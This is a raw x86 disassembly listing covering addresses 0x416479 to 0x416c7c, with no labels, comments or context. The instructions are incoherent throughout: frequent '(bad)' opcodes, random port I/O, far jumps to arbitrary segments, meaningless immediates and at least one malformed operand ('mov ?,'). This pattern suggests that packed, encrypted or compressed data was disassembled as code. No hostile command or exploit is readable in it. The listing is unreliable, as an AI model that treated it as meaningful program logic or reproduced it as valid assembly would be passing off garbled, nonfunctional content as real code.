  416479:	xchg   ebp,eax
  41647a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41647b:	mov    bh,0xb8
  41647d:	aaa    
  41647e:	std    
  41647f:	fild   WORD PTR [edi+0x7e4385f6]
  416485:	inc    ecx
  416486:	hlt    
  416487:	xor    DWORD PTR [ebx+0x48da78d7],ecx
  41648d:	nop
  41648e:	cmp    DWORD PTR [edi-0x73],ebx
  416491:	and    BYTE PTR [edi+0x13],bh
  416494:	aam    0x21
  416496:	xchg   ebx,eax
  416497:	push   esi
  416498:	jne    0x4164de
  41649a:	cs jns 0x4164d3
  41649d:	push   edx
  41649e:	sbb    ch,BYTE PTR [eax-0x27e7c8dc]
  4164a4:	addr16 hlt 
  4164a6:	aaa    
  4164a7:	adc    BYTE PTR [edx+0x41e4559],bl
  4164ad:	mov    bl,0x42
  4164af:	aam    0xc5
  4164b1:	adc    DWORD PTR [edi+0x16770eb4],0x4b1324cb
  4164bb:	or     dh,BYTE PTR [eax+0x50]
  4164be:	mov    ebp,0xe6e56d69
  4164c3:	neg    BYTE PTR [esi+0x74fbab6f]
  4164c9:	and    al,0xfb
  4164cb:	in     al,0xf7
  4164cd:	mov    eax,0xa22e12d
  4164d2:	xor    eax,0xf7ee3c69
  4164d7:	mov    cs,edx
  4164d9:	mov    esi,0xae12118d
  4164de:	das    
  4164df:	dec    ebx
  4164e0:	imul   ebx,DWORD PTR [eax],0x5bcfe438
  4164e6:	or     dl,BYTE PTR [ebx-0x59369eba]
  4164ec:	dec    edi
  4164ed:	je     0x416508
  4164ef:	in     al,0xb6
  4164f1:	push   esp
  4164f2:	xchg   ecx,eax
  4164f3:	ja     0x416534
  4164f5:	out    dx,al
  4164f6:	jge    0x416478
  4164f8:	sbb    DWORD PTR [ebx-0x47d4df6d],0xffffff85
  4164ff:	ret    
  416500:	(bad)  
  416501:	and    eax,0x186307b6
  416506:	push   eax
  416507:	jo     0x41654b
  416509:	in     al,0xdc
  41650b:	scas   eax,DWORD PTR es:[edi]
  41650c:	mov    al,0x82
  41650e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41650f:	out    dx,eax
  416510:	cdq    
  416511:	ins    DWORD PTR es:[edi],dx
  416512:	mov    ch,0xe0
  416514:	popa   
  416515:	bound  edi,QWORD PTR [esi-0x2840e0b6]
  41651b:	xchg   esi,eax
  41651c:	jp     0x4164b5
  41651e:	inc    ebp
  41651f:	lods   al,BYTE PTR ds:[esi]
  416520:	xor    BYTE PTR [edi-0x5a],dl
  416523:	cdq    
  416524:	inc    ebx
  416525:	xor    BYTE PTR [ecx+0x727b411b],0x4a
  41652c:	ss pop ss
  41652e:	stc    
  41652f:	inc    ebx
  416530:	cld    
  416531:	mov    eax,0x1ef1c6b
  416536:	aam    0xa8
  416538:	inc    ebx
  416539:	stc    
  41653a:	mov    esp,0xe78beef4
  41653f:	outs   dx,DWORD PTR ds:[esi]
  416540:	dec    edi
  416541:	add    BYTE PTR [esi],ah
  416543:	int    0x63
  416545:	lds    eax,FWORD PTR [edx]
  416547:	mov    WORD PTR [edi-0x32],fs
  41654a:	adc    eax,0x74467918
  41654f:	iret   
  416550:	cmp    eax,0x50befd5
  416555:	ds stc 
  416557:	scas   al,BYTE PTR es:[edi]
  416558:	mov    edx,0x74b55f72
  41655d:	mov    bh,0x33
  41655f:	mov    bh,0xfc
  416561:	iret   
  416562:	call   0xd6db99b2
  416567:	pusha  
  416568:	stc    
  416569:	lock out 0x1f,al
  41656c:	adc    al,0x8a
  41656e:	mov    ch,0xa8
  416570:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416571:	lds    ebp,FWORD PTR [ebx+0x6bc2b4a6]
  416577:	xor    al,ah
  416579:	jmp    0x881d:0xe465bfb9
  416580:	jb     0x4165a5
  416582:	jp     0x416514
  416584:	dec    ebp
  416585:	les    esp,FWORD PTR [eax+0x146529a6]
  41658b:	repz pushf 
  41658d:	out    dx,al
  41658e:	ds int 0x75
  416591:	xor    BYTE PTR [esi+0x2ce66939],dh
  416597:	rcr    eax,1
  416599:	fs enter 0x9f53,0xf
  41659e:	sub    eax,0xa5fea9e2
  4165a3:	pop    ecx
  4165a4:	mov    esp,0xa2252bd6
  4165a9:	fdivr  DWORD PTR [ebx-0x24]
  4165ac:	retf   0x5179
  4165af:	xor    eax,0x67901e8c
  4165b4:	cmp    eax,DWORD PTR [eax+edi*1+0x2b5b32]
  4165bb:	ss stc 
  4165bd:	in     eax,dx
  4165be:	jbe    0x41660a
  4165c0:	ins    BYTE PTR es:[edi],dx
  4165c1:	stc    
  4165c2:	aaa    
  4165c3:	add    al,0x20
  4165c5:	jae    0x4165b8
  4165c7:	push   es
  4165c8:	xor    eax,0xe5f4aef7
  4165cd:	outs   dx,BYTE PTR ds:[esi]
  4165ce:	xchg   edx,eax
  4165cf:	stc    
  4165d0:	jne    0x416603
  4165d2:	fs mov cl,bl
  4165d5:	(bad)  
  4165d6:	ss mov bh,0x2e
  4165d9:	(bad)  
  4165da:	rol    BYTE PTR [ebp+0x78e3b400],cl
  4165e0:	sub    eax,0x4e38340a
  4165e5:	cdq    
  4165e6:	fwait
  4165e7:	stos   DWORD PTR es:[edi],eax
  4165e8:	ret    0x289b
  4165eb:	sbb    ebp,DWORD PTR [ebp-0x5f5c6364]
  4165f1:	adc    DWORD PTR [ebx-0x7005e441],eax
  4165f7:	lea    ebp,[eax-0x259e08c4]
  4165fd:	inc    edx
  4165fe:	out    dx,al
  4165ff:	aad    0x83
  416601:	cmc    
  416602:	(bad)  
  416603:	stc    
  416604:	push   es
  416605:	xor    DWORD PTR [esi+0x6c04664d],0xffffffcf
  41660c:	sub    eax,0x95edd7d8
  416611:	es cwde 
  416613:	and    edi,ebp
  416615:	call   0x989b:0x3cc597f9
  41661c:	outs   dx,BYTE PTR ds:[esi]
  41661d:	inc    ebx
  41661e:	pop    es
  41661f:	outs   dx,DWORD PTR ds:[esi]
  416620:	popf   
  416621:	xor    al,0x30
  416623:	stc    
  416624:	fbld   TBYTE PTR [esi-0x45]
  416627:	mov    bl,0xf5
  416629:	fs enter 0x241a,0xf3
  41662e:	sbb    al,0x35
  416630:	(bad)  [ebx]
  416632:	clc    
  416633:	inc    edx
  416634:	clc    
  416635:	fdiv   QWORD PTR [ecx+0x24261698]
  41663b:	inc    eax
  41663c:	xor    BYTE PTR [eax-0x5c],0xc8
  416640:	mov    edi,0xc417e0eb
  416645:	or     eax,ecx
  416647:	xchg   esi,eax
  416648:	dec    ebp
  416649:	xchg   ecx,eax
  41664a:	shl    esi,1
  41664c:	cwde   
  41664d:	popf   
  41664e:	xchg   bl,cl
  416650:	cmp    ah,BYTE PTR [ecx-0x8e1ce85]
  416656:	jns    0x4166d5
  416658:	mov    ds:0x1742d10b,al
  41665d:	int    0x7c
  41665f:	and    esp,DWORD PTR [esi-0x47603bbe]
  416665:	or     ah,bl
  416667:	es enter 0x5135,0x83
  41666c:	and    al,0x72
  41666e:	test   al,0x31
  416670:	and    edx,DWORD PTR [ebp-0x2f46672e]
  416676:	rol    DWORD PTR [edx+0x45],0xcf
  41667a:	mov    al,ds:0xe463324
  41667f:	icebp  
  416680:	outs   dx,DWORD PTR ds:[esi]
  416681:	jle    0x416623
  416683:	mov    edx,0x6bdd25f9
  416688:	add    cl,dl
  41668a:	sbb    ebp,ecx
  41668c:	jae    0x4166f5
  41668e:	fnsave [edx]
  416690:	loop   0x41665e
  416692:	xchg   edi,eax
  416693:	dec    esi
  416694:	mov    esi,0x6814c456
  416699:	test   eax,0x3331420
  41669e:	dec    edx
  4166a0:	imul   esi,DWORD PTR [edx+0x2acc0196],0x6103039
  4166aa:	inc    edi
  4166ab:	(bad)  [ebx-0x4ecf1d27]
  4166b1:	adc    BYTE PTR [ecx-0x5ba44e77],ah
  4166b7:	inc    ebp
  4166b8:	(bad)  
  4166b9:	jo     0x41667c
  4166bb:	(bad)  
  4166bd:	clc    
  4166be:	push   edx
  4166bf:	rol    DWORD PTR [edi],cl
  4166c1:	mov    ebp,0xc8f6b921
  4166c6:	xor    dh,BYTE PTR [ebp-0x604952ea]
  4166cc:	add    BYTE PTR [ebx-0x49],bh
  4166cf:	imul   eax,DWORD PTR [edi],0x38144e6
  4166d5:	ficom  DWORD PTR [ebx+0x5e]
  4166d8:	pop    ds
  4166d9:	ins    DWORD PTR es:[edi],dx
  4166da:	sahf   
  4166db:	xor    esp,DWORD PTR [ebx-0x41b680c7]
  4166e1:	push   edi
  4166e2:	clc    
  4166e3:	mov    BYTE PTR [ecx+0x33],ch
  4166e6:	in     eax,0x79
  4166e8:	jle    0x41667d
  4166ea:	and    al,0x56
  4166ec:	xchg   DWORD PTR [ebp+0x1fbd504a],edi
  4166f2:	cld    
  4166f3:	xor    dl,dh
  4166f5:	push   edi
  4166f6:	outs   dx,BYTE PTR ds:[esi]
  4166f7:	nop
  4166f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166f9:	(bad)  
  4166fb:	jae    0x4166c3
  4166fd:	or     eax,DWORD PTR ds:0xe2aeaf7f
  416703:	(bad)  
  416704:	push   ebp
  416705:	scas   eax,DWORD PTR es:[edi]
  416706:	mov    bh,0x6d
  416708:	mov    cl,0xf3
  41670a:	mov    esi,0x38972d3
  41670f:	xchg   edx,eax
  416710:	les    edi,FWORD PTR [ebx]
  416712:	jnp    0x41673b
  416714:	pop    edx
  416715:	inc    esp
  416716:	fs jl  0x416754
  416719:	dec    ecx
  41671a:	push   ss
  41671b:	mov    dl,BYTE PTR [ecx+0x28]
  41671e:	int    0xa7
  416720:	xchg   esi,eax
  416721:	jb     0x4166af
  416723:	inc    eax
  416724:	fistp  DWORD PTR [edi]
  416726:	mov    eax,ds:0xb93a20ef
  41672b:	and    eax,0xbfa71da8
  416730:	or     al,0x74
  416732:	xlat   BYTE PTR ds:[ebx]
  416733:	dec    eax
  416734:	sbb    eax,0x331da45c
  416739:	fmul   QWORD PTR [ecx]
  41673b:	loop   0x416784
  41673d:	es add eax,0x716de994
  416743:	jb     0x416725
  416745:	aam    0xe0
  416747:	sbb    ah,BYTE PTR ds:0x21e1bdc
  41674d:	(bad)  
  41674e:	mov    eax,0x901ff64d
  416753:	repz jl 0x416798
  416756:	and    BYTE PTR [edi+eax*4-0x1d04822a],0x7c
  41675e:	sbb    BYTE PTR [edx+0x40],bh
  416761:	xchg   edx,eax
  416762:	div    BYTE PTR [edx+0x27]
  416765:	mov    gs,WORD PTR [edi]
  416767:	rcl    edi,cl
  416769:	arpl   WORD PTR [ecx],dx
  41676b:	adc    al,0x78
  41676d:	mov    ds:0x767c33a6,eax
  416772:	mov    eax,ds:0x39913202
  416777:	dec    ecx
  416778:	bound  ebx,QWORD PTR fs:0xbfa58cc8
  41677f:	icebp  
  416780:	leave  
  416781:	comiss xmm4,DWORD PTR [ecx]
  416784:	cmp    al,0xce
  416786:	or     DWORD PTR [edi-0x16],ebp
  416789:	imul   DWORD PTR [edi-0x7dd8873e]
  41678f:	ins    BYTE PTR es:[edi],dx
  416790:	(bad)  
  416792:	sahf   
  416793:	pop    esp
  416794:	pop    ebx
  416795:	fchs   
  416797:	mov    cs,WORD PTR [ebx-0x36]
  41679a:	call   0xa0c8179c
  41679f:	adc    eax,0x77997047
  4167a4:	jg     0x41681e
  4167a6:	jnp    0x4167e3
  4167a8:	in     al,0xfb
  4167aa:	or     cl,BYTE PTR ds:0xcbfb4b3b
  4167b0:	mov    ch,0xab
  4167b2:	mov    eax,0x5a249f52
  4167b7:	push   edi
  4167b8:	outs   dx,BYTE PTR ds:[esi]
  4167b9:	sub    DWORD PTR [edx+0x26],esp
  4167bc:	lahf   
  4167bd:	pushf  
  4167be:	in     al,0x93
  4167c0:	pop    eax
  4167c1:	sbb    eax,0x8c796eaa
  4167c6:	mov    esp,0xe496241f
  4167cb:	data16 sbb bh,bh
  4167ce:	mov    ebp,0xec1ffcf
  4167d3:	push   ds
  4167d4:	add    al,BYTE PTR [ebp+ebx*1-0x5a10be80]
  4167db:	jns    0x416838
  4167dd:	inc    eax
  4167de:	push   ecx
  4167df:	inc    ebp
  4167e0:	cwde   
  4167e1:	mov    ah,0xf7
  4167e3:	or     eax,0x7ca3f9d5
  4167e8:	add    BYTE PTR [ebx+0x67cb1324],bh
  4167ee:	inc    edx
  4167ef:	mov    al,ds:0x7cda2bae
  4167f4:	in     al,dx
  4167f5:	mov    ds:0x98919338,eax
  4167fa:	fcomp  QWORD PTR [eax]
  4167fc:	inc    ebx
  4167fd:	or     BYTE PTR [edx],bl
  4167ff:	pop    es
  416800:	inc    ecx
  416801:	add    DWORD PTR [edx+ebp*1],esi
  416804:	fs ds push edi
  416807:	pop    eax
  416808:	mov    ecx,0x537512c0
  41680d:	std    
  41680e:	call   0xd76ec499
  416813:	test   al,0xca
  416815:	mov    ebp,0xf4e9a8a6
  41681a:	dec    ebx
  41681b:	icebp  
  41681c:	cmp    al,0xf0
  41681e:	sub    dh,BYTE PTR [ecx+0xc7b790b]
  416824:	xchg   bl,ch
  416826:	(bad)  
  416827:	addr16 push esp
  416829:	call   0x7525:0x7f50d19e
  416830:	xchg   esi,eax
  416831:	pop    edx
  416832:	dec    eax
  416833:	cmp    edx,ebx
  416835:	xchg   ebp,eax
  416836:	fidiv  WORD PTR [ebx+0x15]
  416839:	test   ah,0xbb
  41683c:	mov    ch,0xac
  41683e:	retf   
  41683f:	in     eax,0x32
  416841:	add    DWORD PTR [ecx-0x77],ecx
  416844:	jg     0x416897
  416846:	and    esi,DWORD PTR [edi+0x6003d4df]
  41684c:	(bad)  [ecx]
  41684e:	ficomp DWORD PTR [ebp+0x1a]
  416851:	push   0x25
  416853:	pusha  
  416854:	ds and eax,0xda857ecc
  41685a:	(bad)  
  41685b:	shl    BYTE PTR [ebx+0x26],0x16
  41685f:	mov    bh,0xfa
  416861:	out    0xdd,eax
  416863:	test   DWORD PTR [ecx-0x1dac334b],ebx
  416869:	add    esi,DWORD PTR [edi]
  41686b:	hlt    
  41686c:	mov    eax,0xc7f6ec18
  416871:	or     cl,BYTE PTR [ebx-0x52]
  416874:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416875:	call   0x2d8e:0x9c4c2b87
  41687c:	or     al,0xff
  41687e:	and    edx,DWORD PTR [ebx+0x336f3b30]
  416884:	ss out dx,eax
  416886:	add    eax,0x696dbdd4
  41688b:	inc    eax
  41688c:	stos   BYTE PTR es:[edi],al
  41688d:	mov    ebx,0xf49a81f8
  416892:	mov    dh,0xdf
  416894:	jl     0x41681f
  416896:	jg     0x416852
  416898:	push   ebx
  416899:	imul   esp,DWORD PTR [edx-0x5d291661],0x5d62393b
  4168a3:	and    al,0xea
  4168a5:	imul   ebx,DWORD PTR [eax],0x10
  4168a8:	sbb    dl,BYTE PTR [esi+eax*1-0x77]
  4168ac:	pop    ebx
  4168ad:	(bad)  
  4168ae:	push   esp
  4168af:	xor    al,0xd5
  4168b1:	loope  0x41686e
  4168b3:	aaa    
  4168b4:	les    esp,FWORD PTR [eax+0x40]
  4168b7:	out    dx,eax
  4168b8:	jecxz  0x416881
  4168ba:	jl     0x4168ab
  4168bc:	mov    ecx,DWORD PTR [edi+0x36]
  4168bf:	jno    0x4168e2
  4168c1:	scas   al,BYTE PTR es:[edi]
  4168c2:	inc    eax
  4168c3:	mov    ds:0xcf3f5869,eax
  4168c8:	sbb    al,0xd1
  4168ca:	aas    
  4168cb:	fild   DWORD PTR [edi]
  4168cd:	sbb    BYTE PTR [esi],0x7e
  4168d0:	sub    al,0xa8
  4168d2:	daa    
  4168d3:	mov    ebx,DWORD PTR [ecx-0x58]
  4168d6:	mov    ch,0x8f
  4168d8:	xchg   ecx,eax
  4168d9:	mov    bl,0x9d
  4168db:	xchg   ecx,eax
  4168dc:	push   ss
  4168dd:	mov    al,ds:0x82de2392
  4168e2:	pmulhuw mm5,QWORD PTR [ecx-0x61]
  4168e6:	es dec ebx
  4168e8:	adc    bl,BYTE PTR [eax+edx*4-0x27]
  4168ec:	or     edi,DWORD PTR [edx-0x10]
  4168ef:	jo     0x41694f
  4168f1:	mov    BYTE PTR [ebx],ch
  4168f3:	int    0x4a
  4168f5:	(bad)
  4168fa:	arpl   WORD PTR [edi+0x62],cx
  4168fd:	mov    ebx,DWORD PTR [ebp-0x1327058a]
  416903:	or     eax,0xa7bdfa43
  416908:	jne    0x416956
  41690a:	imul   esi,DWORD PTR [eax-0x1b6875e0],0x2475dd22
  416914:	inc    edi
  416915:	fsub   QWORD PTR [ebx+ecx*4+0x6b365d45]
  41691c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41691d:	jmp    0xd5d9:0x3198a32f
  416924:	pop    ds
  416925:	xlat   BYTE PTR ds:[ebx]
  416926:	mov    esp,0xb29ee677
  41692b:	(bad)  
  41692c:	das    
  41692d:	fistp  QWORD PTR [esi+0x9f8c2a4]
  416933:	es xchg ebx,eax
  416935:	addr16 adc al,0x5f
  416938:	cmc    
  416939:	ror    bl,cl
  41693b:	jp     0x4168e7
  41693d:	dec    esp
  41693e:	add    ecx,DWORD PTR [ebx-0x688307a5]
  416944:	cld    
  416945:	loop   0x4169af
  416947:	je     0x4169aa
  416949:	inc    eax
  41694a:	lods   al,BYTE PTR ds:[esi]
  41694b:	mov    dl,0xc6
  41694d:	mov    esp,0x9eb74d35
  416952:	fcmovnbe st,st(1)
  416954:	ret    
  416955:	xor    eax,0x998859b0
  41695a:	aad    0xb4
  41695c:	rcl    BYTE PTR [ebp-0x5b],0x30
  416960:	xor    bl,ah
  416962:	cwde   
  416963:	mov    ecx,0xafecf34c
  416968:	loop   0x4168f2
  41696a:	lds    ecx,FWORD PTR [ebx+0x331c98c9]
  416970:	xchg   ebx,eax
  416971:	sar    BYTE PTR [eax],0xf4
  416974:	push   edx
  416975:	call   0xe8ce32fa
  41697a:	xor    bh,BYTE PTR [ecx+0x73deb310]
  416980:	(bad)  
  416981:	inc    ebx
  416982:	into   
  416983:	pop    ebx
  416984:	xlat   BYTE PTR ds:[ebx]
  416985:	mov    al,ds:0x88e2852
  41698a:	push   ds
  41698b:	cmp    al,0x66
  41698d:	outs   dx,BYTE PTR ds:[esi]
  41698e:	xchg   dh,dl
  416990:	or     al,0xce
  416992:	mov    cl,0x53
  416994:	xchg   esp,eax
  416995:	inc    edi
  416996:	inc    edi
  416997:	aas    
  416998:	jnp    0x4169b4
  41699a:	jmp    0x41699b
  41699c:	retf   
  41699d:	or     esp,DWORD PTR [edi+0x8]
  4169a0:	add    ebx,0xffffff90
  4169a3:	aaa    
  4169a4:	int    0x94
  4169a6:	je     0x416963
  4169a8:	aaa    
  4169a9:	push   0xffffffb9
  4169ab:	mov    eax,0xd7794fe1
  4169b0:	push   0xffffffce
  4169b2:	mov    ebp,0x20060ff4
  4169b7:	sbb    ebx,ecx
  4169b9:	frstor [edx+0x5a3b28cd]
  4169bf:	rol    BYTE PTR [edi+0x2f6572e3],cl
  4169c5:	inc    esi
  4169c6:	int    0xaf
  4169c8:	daa    
  4169c9:	outs   dx,BYTE PTR ds:[esi]
  4169ca:	mov    eax,ds:0xd84edb6f
  4169cf:	cwde   
  4169d0:	fnstsw WORD PTR [edi+0x37744cd9]
  4169d6:	call   0xbeed:0xfc57fede
  4169dd:	cld    
  4169de:	pop    esp
  4169df:	pop    ss
  4169e0:	popf   
  4169e1:	add    al,0x94
  4169e3:	cli    
  4169e4:	in     al,0x39
  4169e6:	jne    0x416a04
  4169e8:	jns    0x41699d
  4169ea:	inc    edx
  4169eb:	test   BYTE PTR [esp+ecx*4+0x7a49a11c],dh
  4169f2:	mov    bh,0x3f
  4169f4:	pop    edx
  4169f5:	add    eax,0x8d1b5a97
  4169fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169fb:	ret    0x2db0
  4169fe:	ds adc eax,0xac7ea614
  416a04:	mov    bh,0x29
  416a06:	cli    
  416a07:	or     eax,0x6cefbdcb
  416a0c:	ins    DWORD PTR es:[edi],dx
  416a0d:	jp     0x4169d0
  416a0f:	xlat   BYTE PTR ds:[ebx]
  416a10:	fs ret 0x4023
  416a14:	(bad)  
  416a15:	ins    DWORD PTR es:[edi],dx
  416a16:	lds    eax,FWORD PTR [bx+di-0x385b]
  416a1b:	xor    al,0xe5
  416a1d:	pop    ds
  416a1e:	fs pop sp
  416a21:	inc    edx
  416a22:	int3   
  416a23:	jp     0x416a2a
  416a25:	inc    ebp
  416a26:	push   cs
  416a27:	dec    ebx
  416a28:	mov    eax,0x45f19764
  416a2d:	adc    eax,0x42d2cfd0
  416a32:	xchg   esp,eax
  416a33:	sbb    eax,0x58519878
  416a38:	and    DWORD PTR [ebp+0xa],eax
  416a3b:	xlat   BYTE PTR ds:[ebx]
  416a3c:	scas   al,BYTE PTR es:[edi]
  416a3d:	scas   eax,DWORD PTR es:[edi]
  416a3e:	test   DWORD PTR [eax-0x2adb4cd9],esi
  416a44:	test   al,0x84
  416a46:	and    al,0x21
  416a48:	(bad)  
  416a49:	jge    0x4169ec
  416a4b:	outs   dx,DWORD PTR ds:[esi]
  416a4c:	sbb    al,BYTE PTR [ecx-0x2b]
  416a4f:	xor    eax,0xecf5ed20
  416a54:	test   al,0xab
  416a56:	int    0xc2
  416a58:	clc    
  416a59:	mov    eax,0x4c0cffb8
  416a5e:	daa    
  416a5f:	xchg   esi,eax
  416a60:	sar    DWORD PTR [edi+0x3d],cl
  416a63:	jmp    0xf640:0xd8aba83d
  416a6a:	pop    ecx
  416a6b:	pop    ss
  416a6c:	addr16 leave 
  416a6e:	lods   eax,DWORD PTR ds:[esi]
  416a6f:	mov    DWORD PTR [edi-0x7e566987],ecx
  416a75:	sbb    BYTE PTR [ecx+0x25470f87],dh
  416a7b:	pop    ds
  416a7c:	scas   al,BYTE PTR es:[edi]
  416a7d:	cs jae 0x416a01
  416a80:	xchg   ebx,eax
  416a81:	sbb    al,0x67
  416a83:	jmp    0x8e24:0xb751981d
  416a8a:	jl     0x416aec
  416a8c:	xlat   BYTE PTR ds:[ebx]
  416a8d:	xor    DWORD PTR [ecx-0x4ff71fd2],ecx
  416a93:	jg     0x416ad9
  416a95:	mov    dh,0xf9
  416a97:	mov    ds:0xbee9c4f2,al
  416a9c:	pop    ebx
  416a9d:	popf   
  416a9e:	or     al,0xe1
  416aa0:	add    eax,edi
  416aa2:	mov    ?,WORD PTR [eax-0x51]
  416aa5:	test   dh,ch
  416aa7:	and    DWORD PTR [eax-0x442a60ea],ebp
  416aad:	outs   dx,DWORD PTR ds:[esi]
  416aae:	outs   dx,BYTE PTR ds:[esi]
  416aaf:	clc    
  416ab0:	loop   0x416a8c
  416ab2:	hlt    
  416ab3:	inc    ecx
  416ab4:	push   edx
  416ab5:	mov    dh,0x85
  416ab7:	jl     0x416a79
  416ab9:	mov    BYTE PTR [ebp+0x1f],0x2c
  416abd:	push   es
  416abe:	pop    ss
  416abf:	xor    BYTE PTR [ebp+0x64d57b7],bh
  416ac5:	rcr    BYTE PTR [eax+edx*2],0x7e
  416ac9:	mov    ebx,ecx
  416acb:	fild   QWORD PTR [ecx+ebp*2]
  416ace:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416acf:	outs   dx,DWORD PTR ds:[esi]
  416ad0:	adc    al,0x17
  416ad2:	cmc    
  416ad3:	mov    ah,0xf8
  416ad5:	sbb    ah,BYTE PTR [edx-0x4d92c813]
  416adb:	add    DWORD PTR [esp+edi*4+0x1],ecx
  416adf:	scas   al,BYTE PTR es:[edi]
  416ae0:	out    dx,eax
  416ae1:	cld    
  416ae2:	pop    esp
  416ae3:	outs   dx,BYTE PTR ds:[esi]
  416ae4:	push   es
  416ae5:	sbb    ebp,DWORD PTR [edx+ebp*2-0x5a]
  416ae9:	pop    ebx
  416aea:	inc    esp
  416aeb:	or     BYTE PTR [eax-0x4c2134b0],ah
  416af1:	or     ch,BYTE PTR [edx+0x63599a8f]
  416af7:	pop    ecx
  416af8:	stos   DWORD PTR es:[edi],eax
  416af9:	sbb    al,0x5e
  416afb:	mov    ah,0xef
  416afd:	jmp    FWORD PTR [edi+ebp*4-0x26225892]
  416b04:	repnz add ebx,ebx
  416b07:	out    0x1f,eax
  416b09:	mov    dh,0x79
  416b0b:	inc    ebp
  416b0c:	add    eax,0xf6bee691
  416b11:	push   0x58
  416b13:	and    ch,dl
  416b15:	xor    DWORD PTR [ebp+0x4f],0x68
  416b19:	jmp    0x416b50
  416b1b:	stos   BYTE PTR es:[edi],al
  416b1c:	call   0x728ec437
  416b21:	sub    ecx,0xffffffd4
  416b24:	jns    0x416b8b
  416b26:	aam    0xab
  416b28:	xor    edx,DWORD PTR [ebx+0x3e60ef83]
  416b2e:	leave  
  416b2f:	ror    ebx,1
  416b31:	lahf   
  416b32:	and    BYTE PTR [ebx+0x5057482f],0xfd
  416b39:	inc    eax
  416b3a:	ss out 0x8f,eax
  416b3d:	push   edi
  416b3e:	xor    DWORD PTR [ebx-0x2563d77b],edi
  416b44:	clc    
  416b45:	fidiv  WORD PTR [eax+eiz*8]
  416b48:	pop    ss
  416b49:	adc    ah,BYTE PTR [ebp+edx*2-0x7734723c]
  416b50:	test   al,0xd6
  416b52:	xchg   esp,eax
  416b53:	push   cs
  416b54:	sub    al,0xc9
  416b56:	(bad)  
  416b57:	or     al,0xe8
  416b59:	dec    ebp
  416b5a:	adc    esi,DWORD PTR ds:0x6689020e
  416b60:	mov    cl,0x3d
  416b62:	xor    edx,edx
  416b64:	pop    ds
  416b65:	mov    al,ds:0x798b6cc
  416b6a:	inc    ebp
  416b6b:	jbe    0x416bec
  416b6d:	add    al,0x43
  416b6f:	pop    edx
  416b70:	dec    esi
  416b71:	jmp    0x9a61:0x1f4fefc9
  416b78:	jle    0x416b3e
  416b7a:	repz add al,0x9
  416b7d:	inc    esi
  416b7e:	cmp    al,0xdb
  416b80:	mov    ah,0x84
  416b82:	out    0xe1,eax
  416b84:	jo     0x416b50
  416b86:	mov    al,bh
  416b88:	ret    
  416b89:	arpl   dx,cx
  416b8b:	xchg   ecx,eax
  416b8c:	add    dh,0xe5
  416b8f:	jmp    0xee63:0xe0c6256b
  416b96:	ret    0x39db
  416b99:	adc    ebx,DWORD PTR [ebp+0x66576839]
  416b9f:	and    BYTE PTR [edx+0x2d9bee90],dh
  416ba5:	retf   
  416ba6:	loop   0x416bf2
  416ba8:	dec    BYTE PTR [eax]
  416baa:	cwde   
  416bab:	call   0x69d:0x474dc2a5
  416bb2:	fsub   DWORD PTR [eax]
  416bb4:	ficom  WORD PTR ds:0xe43bf2c9
  416bba:	test   eax,0x4b325611
  416bbf:	sbb    al,0x1
  416bc1:	mov    ebp,0x9410f80e
  416bc6:	jnp    0x416bda
  416bc8:	pop    ebx
  416bc9:	mov    bl,0x0
  416bcb:	jecxz  0x416b97
  416bcd:	out    dx,al
  416bce:	cmp    DWORD PTR [ebx+eiz*2+0x31],edx
  416bd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bd3:	js     0x416bb9
  416bd5:	xchg   esp,eax
  416bd6:	push   0x69
  416bd8:	or     DWORD PTR [edx-0x7b],ecx
  416bdb:	call   0x34f237d3
  416be0:	ja     0x416c04
  416be2:	nop
  416be3:	add    eax,0x5f57d0c2
  416be8:	repnz and BYTE PTR [ebp-0x52740d64],dh
  416bef:	mov    ch,bl
  416bf1:	xor    BYTE PTR [ebp+0x54],0x42
  416bf5:	mov    ah,0xc3
  416bf7:	stos   DWORD PTR es:[edi],eax
  416bf8:	lock sub dh,BYTE PTR [eax-0x49]
  416bfc:	pop    es
  416bfd:	fild   QWORD PTR [ebx-0xa11d284]
  416c03:	bound  edx,QWORD PTR [ecx+ecx*4+0x16]
  416c07:	lds    esp,FWORD PTR [ecx+ebp*4-0x75fd863f]
  416c0e:	int    0x7f
  416c10:	iret   
  416c11:	sbb    al,0x64
  416c13:	fwait
  416c14:	leave  
  416c15:	aad    0xbd
  416c17:	inc    ebx
  416c18:	xchg   ecx,eax
  416c19:	lahf   
  416c1a:	inc    esi
  416c1b:	addr16 xchg ecx,eax
  416c1d:	outs   dx,BYTE PTR ds:[esi]
  416c1e:	mov    WORD PTR [ebx+0x76],gs
  416c21:	jg     0x416bdc
  416c23:	mov    eax,ds:0x8260869c
  416c28:	xchg   esi,eax
  416c29:	mov    ds:0x25d95acc,al
  416c2e:	lds    esi,FWORD PTR [ecx]
  416c30:	mov    DWORD PTR [ecx-0x6a],edi
  416c33:	xchg   edi,eax
  416c34:	sub    al,0x47
  416c36:	jecxz  0x416c69
  416c38:	mov    esp,0xd13aecbc
  416c3d:	das    
  416c3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c3f:	dec    esp
  416c40:	and    BYTE PTR [ebp+0x12],dl
  416c43:	in     eax,0x1e
  416c45:	loope  0x416c77
  416c47:	loope  0x416c02
  416c49:	mov    dl,0xe
  416c4b:	loope  0x416c26
  416c4d:	xlat   BYTE PTR ds:[ebx]
  416c4e:	leave  
  416c4f:	js     0x416bef
  416c51:	cld    
  416c52:	pop    ecx
  416c53:	aam    0x3a
  416c55:	inc    esi
  416c56:	inc    esp
  416c57:	push   edx
  416c58:	or     al,0xd3
  416c5a:	cmp    ecx,esp
  416c5c:	pop    edx
  416c5d:	xchg   ecx,eax
  416c5e:	cmp    al,0xfc
  416c60:	loopne 0x416c90
  416c62:	inc    ebp
  416c63:	jnp    0x416c15
  416c65:	inc    eax
  416c66:	mov    ds:0xd191bf6c,al
  416c6b:	cld    
  416c6c:	mov    ch,0xff
  416c6e:	mov    ds:0xd4e65d56,al
  416c73:	pop    ss
  416c74:	mov    esp,0xdfb5011c
  416c79:	aas    
  416c7a:	js     0x416c55
  416c7c:	aam    0x23
